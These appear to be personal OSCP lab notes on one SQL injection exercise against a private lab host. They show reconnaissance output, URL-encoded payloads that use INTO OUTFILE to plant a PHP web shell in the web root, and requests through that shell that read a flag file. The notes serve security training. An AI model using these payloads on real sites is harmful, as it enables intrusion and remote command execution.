---
aliases:
  - SQL Injection
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - sql_injection
  - sqli
author: Mehdi N Tehrani
creat_date: 2023-12-26
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# 10.2.3 Q5
#mysql #outfile #in_band 
## nmap
```
$ sudo nmap -T4 192.168.227.48 -sS -v 

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

## ffuf
```
$ ffuf -u "http://192.168.227.48/FUZZ" -w /usr/share/wordlists/dirb/common.txt
                        [Status: 200, Size: 14129, Words: 4632, Lines: 462, Duration: 276ms]
css                     [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 274ms]
images                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 273ms]
index.php               [Status: 200, Size: 14129, Words: 4632, Lines: 462, Duration: 273ms]
js                      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 271ms]
```

## nginx
```
nginx/1.14.2
```
## sql injection
```
mail-list=testing3123%40email.com'%3bselect+"%3b<%3fphp+system($_GET["cmd"])%3f>%3b"+into+outfile+"/usr/share/nginx/html/r.php"+--+-//
```
### Leaked info
```
version() = 8.0.29
```

### Code Execution
```
mail-list=testing3123%40email.com'+union+select+1,2,3,4,5,'<%3fphp+echo+system($_GET["cmd"])%3f>'+into+outfile+'/var/www/html/r.php'--+-//
```
### Get Flag
```
GET /r.php?cmd=find+/+-name+flag.txt+2>/dev/null HTTP/1.1

/var/www/flag.txt
```

```
GET /r.php?cmd=cat+/var/www/flag.txt HTTP/1.1

OS{}
```












#### databases
```
animal_planet
information_schema
```
#### tables
```
subscribers
ADMINISTRABLE_ROLE_AUTHORIZATIONS
APPLICABLE_ROLES
CHARACTER_SETS
CHECK_CONSTRAINTS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMNS_EXTENSIONS
COLUMN_PRIVILEGES
COLUMN_STATISTICS
ENABLED_ROLES
ENGINES
EVENTS
FILES
INNODB_BUFFER_PAGE
INNODB_BUFFER_PAGE_LRU
INNODB_BUFFER_POOL_STATS
INNODB_CACHED_INDEXES
INNODB_CMP
INNODB_CMPMEM
INNODB_CMPMEM_RESET
INNODB_CMP_PER_INDEX
INNODB_CMP_PER_INDEX_RESET
INNODB_CMP_RESET
INNODB_COLUMNS
INNODB_DATAFILES
INNODB_FIELDS
INNODB_FOREIGN
INNODB_FOREIGN_COLS
INNODB_FT_BEING_DELETED
INNODB_FT_CONFIG
INNODB_FT_DEFAULT_STOPWORD
INNODB_FT_DELETED
INNODB_FT_INDEX_CACHE
INNODB_FT_INDEX_TABLE
INNODB_INDEXES
INNODB_METRICS
INNODB_SESSION_TEMP_TABLESPACES
INNODB_TABLES
INNODB_TABLESPACES
INNODB_TABLESPACES_BRIEF
INNODB_TABLESTATS
INNODB_TEMP_TABLE_INFO
INNODB_TRX
INNODB_VIRTUAL
KEYWORDS
KEY_COLUMN_USAGE
OPTIMIZER_TRACE
PARAMETERS
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
RESOURCE_GROUPS
ROLE_COLUMN_GRANTS
ROLE_ROUTINE_GRANTS
ROLE_TABLE_GRANTS
ROUTINES
SCHEMATA
SCHEMATA_EXTENSIONS
SCHEMA_PRIVILEGES
STATISTICS
ST_GEOMETRY_COLUMNS
ST_SPATIAL_REFERENCE_SYSTEMS
ST_UNITS_OF_MEASURE
TABLES
TABLESPACES
TABLESPACES_EXTENSIONS
TABLES_EXTENSIONS
TABLE_CONSTRAINTS
TABLE_CONSTRAINTS_EXTENSIONS
TABLE_PRIVILEGES
TRIGGERS
USER_ATTRIBUTES
USER_PRIVILEGES
VIEWS
VIEW_ROUTINE_USAGE
VIEW_TABLE_USAGE
```

#### subscribers table columns
```
id
emails
is_donor
donor_type
status
created_at
```